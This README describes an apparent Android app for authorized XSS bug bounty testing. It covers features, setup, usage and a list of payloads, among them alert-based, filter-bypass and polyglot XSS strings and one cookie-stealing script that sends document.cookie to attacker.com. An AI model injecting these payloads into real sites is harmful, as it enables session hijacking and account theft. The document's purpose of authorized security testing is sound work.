# 🔒 XSS Bug Bounty Testing App for Android

A comprehensive Android application designed for ethical bug bounty hunters to test XSS (Cross-Site Scripting) vulnerabilities in authorized web applications.

## ⚠️ Legal Disclaimer

**THIS TOOL IS FOR AUTHORIZED SECURITY TESTING ONLY**

- ✅ Only use on applications you have explicit permission to test
- ✅ Follow bug bounty program rules and scope
- ✅ Respect responsible disclosure guidelines
- ❌ Unauthorized testing is illegal and unethical

By using this app, you agree to use it ethically and legally.

## 🎯 Features

### 1. **Payload Library**
- 100+ pre-built XSS payloads
- Categories: Basic, Advanced, Filter Bypass, Polyglot
- Search and filter functionality
- Copy to clipboard support

### 2. **Testing Interface**
- URL testing with GET/POST methods
- Multiple encoding options (URL, HTML, Base64)
- Real-time response analysis
- Vulnerability detection

### 3. **Payload Encoder**
- URL Encoding
- HTML Entity Encoding
- Base64 Encoding
- Double URL Encoding

### 4. **Response Analyzer**
- Automatic XSS detection
- HTTP status code display
- Response body inspection
- Reflection detection

## 📱 Screenshots

[Add screenshots here]

## 🛠️ Installation & Setup

### Prerequisites
- Android Studio (latest version)
- Android SDK (API 21+)
- Java Development Kit (JDK 8+)

### Step-by-Step Setup

1. **Clone the Repository**
```bash
git clone https://github.com/Hackhubadi/XSS-BugBounty-Android-App.git
cd XSS-BugBounty-Android-App
```

2. **Open in Android Studio**
   - Launch Android Studio
   - File → Open → Select the cloned directory

3. **Sync Gradle**
   - Wait for Gradle sync to complete
   - Resolve any dependency issues

4. **Run the App**
   - Connect Android device or start emulator
   - Click Run (▶️) button
   - Select target device

## 📂 Project Structure

```
app/
├── src/
│   ├── main/
│   │   ├── java/com/bugbounty/xsstester/
│   │   │   ├── MainActivity.java              # Main dashboard
│   │   │   ├── PayloadLibraryActivity.java    # Payload browser
│   │   │   ├── TestingActivity.java           # Testing interface
│   │   │   ├── ReportActivity.java            # Report generator
│   │   │   ├── models/
│   │   │   │   ├── Payload.java               # Payload model
│   │   │   │   ├── TestResult.java            # Test result model
│   │   │   │   └── Report.java                # Report model
│   │   │   ├── adapters/
│   │   │   │   ├── PayloadAdapter.java        # RecyclerView adapter
│   │   │   │   └── ResultAdapter.java         # Results adapter
│   │   │   └── utils/
│   │   │       ├── PayloadEncoder.java        # Encoding utilities
│   │   │       ├── NetworkHelper.java         # HTTP client
│   │   │       └── ReportGenerator.java       # PDF/HTML reports
│   │   ├── res/
│   │   │   ├── layout/                        # XML layouts
│   │   │   ├── values/                        # Strings, colors, styles
│   │   │   └── drawable/                      # Icons and images
│   │   └── AndroidManifest.xml
│   └── build.gradle
└── build.gradle
```

## 🚀 Usage Guide

### 1. Testing for XSS

1. Open the app and accept the legal disclaimer
2. Navigate to **Testing** section
3. Enter target URL (e.g., `https://example.com/search`)
4. Enter parameter name (e.g., `q`)
5. Select or enter XSS payload
6. Choose HTTP method (GET/POST)
7. Select encoding type if needed
8. Tap **Test** button
9. Review response and vulnerability status

### 2. Using Payload Library

1. Navigate to **Payload Library**
2. Browse through categories
3. Use search to find specific payloads
4. Tap payload to copy to clipboard
5. Use in testing interface

### 3. Common XSS Testing Scenarios

**Reflected XSS:**
```
URL: https://target.com/search?q=<script>alert('XSS')</script>
```

**Stored XSS:**
```
Submit payload in form → Check if stored → Verify execution
```

**DOM-based XSS:**
```
URL: https://target.com/#<img src=x onerror=alert(1)>
```

## 🔧 Configuration

### Adding Custom Payloads

Edit `PayloadLibraryActivity.java`:

```java
payloadList.add(new Payload(
    "Custom Payload Name",
    "<your-xss-payload>",
    "Category"
));
```

### Modifying Network Timeout

Edit `NetworkHelper.java`:

```java
connection.setConnectTimeout(15000); // 15 seconds
connection.setReadTimeout(15000);
```

## 📋 Payload Categories

### Basic Payloads
- `<script>alert('XSS')</script>`
- `<img src=x onerror=alert('XSS')>`
- `<svg onload=alert('XSS')>`

### Filter Bypass
- `<ScRiPt>alert('XSS')</sCrIpT>`
- `<svg/onload=alert`1`>`
- `%3Cscript%3Ealert('XSS')%3C/script%3E`

### Polyglot
- `javascript:/*--></title></style></textarea></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`

### Cookie Stealing
- `<script>fetch('https://attacker.com?c='+document.cookie)</script>`

## 🎓 Bug Bounty Platforms

Test on authorized platforms:
- [HackerOne](https://hackerone.com)
- [Bugcrowd](https://bugcrowd.com)
- [Synack](https://synack.com)
- [Intigriti](https://intigriti.com)
- [YesWeHack](https://yeswehack.com)

## 🔐 Security Best Practices

1. **Always get written permission** before testing
2. **Follow program scope** - Don't test out-of-scope assets
3. **Respect rate limits** - Don't DoS the target
4. **Report responsibly** - Follow disclosure guidelines
5. **Keep records** - Document all testing activities

## 🤝 Contributing

Contributions are welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Commit your changes
4. Push to the branch
5. Open a Pull Request

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 👨‍💻 Author

**Aditya Sharma**
- GitHub: [@Hackhubadi](https://github.com/Hackhubadi)
- Email: adi246965@gmail.com

## 🙏 Acknowledgments

- OWASP for XSS documentation
- Bug bounty community for payload research
- Android development community

## 📚 Resources

- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [Bug Bounty Methodology](https://github.com/jhaddix/tbhm)

## ⚡ Quick Start

```bash
# Clone repo
git clone https://github.com/Hackhubadi/XSS-BugBounty-Android-App.git

# Open in Android Studio
# Build and Run

# Start testing (with permission!)
```

---

**Remember: With great power comes great responsibility. Use this tool ethically!** 🛡️
